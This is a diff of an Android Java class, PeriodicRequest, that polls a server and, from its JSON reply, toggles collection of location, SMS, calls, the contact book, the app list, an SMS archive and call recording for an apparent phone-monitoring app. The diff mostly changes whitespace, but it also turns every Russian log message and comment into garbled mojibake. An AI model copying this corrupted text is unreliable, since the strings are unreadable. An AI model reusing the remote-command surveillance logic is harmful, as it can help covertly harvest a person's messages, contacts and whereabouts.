@@ -20,7 +20,7 @@ import android.preference.PreferenceManager;
 public class PeriodicRequest extends DefaultRequest {
 	private final String LOG_TAG = "PeriodicRequest";
 	Context ctx;
-	
+
 	public PeriodicRequest(Context ctx) {
 		super(ctx);
 		this.ctx = ctx;
@@ -31,7 +31,7 @@ public class PeriodicRequest extends DefaultRequest {
 		PeriodicRequestTask frt = new PeriodicRequestTask();
 		frt.execute(request);
 	}
-	
+
 	class PeriodicRequestTask extends AsyncTask<String, Void, Void> {
 
 		@Override
@@ -57,32 +57,32 @@ public class PeriodicRequest extends DefaultRequest {
 		if (str != null) {
 			getRequestData(str);
 		} else {
-			Logging.doLog(LOG_TAG, "ответа от сервера нет или он некорректен",
-					"ответа от сервера нет или он некорректен");
+			Logging.doLog(LOG_TAG, "Г®ГІГўГҐГІГ  Г®ГІ Г±ГҐГ°ГўГҐГ°Г  Г­ГҐГІ ГЁГ«ГЁ Г®Г­ Г­ГҐГЄГ®Г°Г°ГҐГЄГІГҐГ­",
+					"Г®ГІГўГҐГІГ  Г®ГІ Г±ГҐГ°ГўГҐГ°Г  Г­ГҐГІ ГЁГ«ГЁ Г®Г­ Г­ГҐГЄГ®Г°Г°ГҐГЄГІГҐГ­");
 			SharedPreferences sp = PreferenceManager
 					.getDefaultSharedPreferences(ctx);
 			Editor ed = sp.edit();
 			ed.putString("code", "1");
 			ed.commit();
-			
+
 		}
 	}
 
 	@Override
 	protected void getRequestData(String response) {
 		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);
-		
+
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(ctx);
 		Editor ed = sp.edit();
-		
+
 		JSONObject jsonObject;
 		try {
 			jsonObject = new JSONObject(response);
 		} catch (JSONException e) {
 			return;
 		}
-		
+
 		String str = null;
 		try {
 			str = jsonObject.getString("code");
@@ -94,22 +94,22 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("code", "");
 		}
-		
-		// режим ожидания принятия решения
+
+		// Г°ГҐГ¦ГЁГ¬ Г®Г¦ГЁГ¤Г Г­ГЁГї ГЇГ°ГЁГ­ГїГІГЁГї Г°ГҐГёГҐГ­ГЁГї
 		if (str.equals("1")) {
 			ed.putString("period", "1");
 			ed.commit();
 			return;
 		}
-		
-		// переход в пассивный режим работы 
+
+		// ГЇГҐГ°ГҐГµГ®Г¤ Гў ГЇГ Г±Г±ГЁГўГ­Г»Г© Г°ГҐГ¦ГЁГ¬ Г°Г ГЎГ®ГІГ» 
 		if (str.equals("3")) {
 			ed.putString("period", "10");
 			ed.commit();
 			return;
 		}
-		
-		// ошибки
+
+		// Г®ГёГЁГЎГЄГЁ
 		if (str.equals("0")) {
 			String errstr = null;
 			try {
@@ -125,8 +125,8 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.commit();
 			return;
 		}
-		
-		// активный режим работы
+
+		// Г ГЄГІГЁГўГ­Г»Г© Г°ГҐГ¦ГЁГ¬ Г°Г ГЎГ®ГІГ»
 		if (str.equals("2")) {
 			ed.putString("period", "1");
 		}
@@ -141,7 +141,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("geo_mode");
 		} catch (JSONException e) {
@@ -152,7 +152,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo_mode", "1");
 		}
-		
+
 		try {
 			str = jsonObject.getString("sms");
 		} catch (JSONException e) {
@@ -174,7 +174,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("call", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("telbook");
 		} catch (JSONException e) {
@@ -196,7 +196,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("listapp", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("arhsms");
 		} catch (JSONException e) {
@@ -240,7 +240,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("recall", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("UTCT");
 		} catch (JSONException e) {
@@ -295,7 +295,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("brk_to", "");
 		}
-		
+
 		try {
 			str = jsonObject.getString("error");
 		} catch (JSONException e) {
